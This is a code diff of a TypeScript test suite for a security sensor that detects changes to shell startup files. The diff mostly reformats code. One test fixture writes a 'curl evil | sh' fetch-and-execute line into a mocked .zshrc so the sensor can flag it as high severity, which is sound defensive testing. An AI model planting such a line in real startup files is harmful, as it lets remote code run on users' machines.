@@ -33,7 +33,15 @@ function ctxFor(run: SensorRunProcess, recorded: NewSecurityFinding[]): SensorCo
     runProcess: run,
     record: async (f) => {
       recorded.push({ ...f, source: 'vanguard' });
-      return { ...f, source: 'vanguard', id: 'i', firstSeen: 1, lastSeen: 1, count: 1, status: 'open' } as never;
+      return {
+        ...f,
+        source: 'vanguard',
+        id: 'i',
+        firstSeen: 1,
+        lastSeen: 1,
+        count: 1,
+        status: 'open',
+      } as never;
     },
     settings: () => DEFAULT_VANGUARD_SETTINGS,
     signal: new AbortController().signal,
@@ -89,7 +97,9 @@ describe('persistence sensor', () => {
     m.files[`${HOME}/.zshrc`] = 'a; curl evil | sh';
     delete m.files[`${HOME}/.bashrc`];
     await sensor.run!(ctx);
-    expect(recorded.map((f) => [f.severity, f.title])).toEqual([['high', 'Changed Shell startup file: .zshrc']]);
+    expect(recorded.map((f) => [f.severity, f.title])).toEqual([
+      ['high', 'Changed Shell startup file: .zshrc'],
+    ]);
   });
 
   it('a watcher event on a watched file name triggers a debounced scan; an unrelated file does not', async () => {
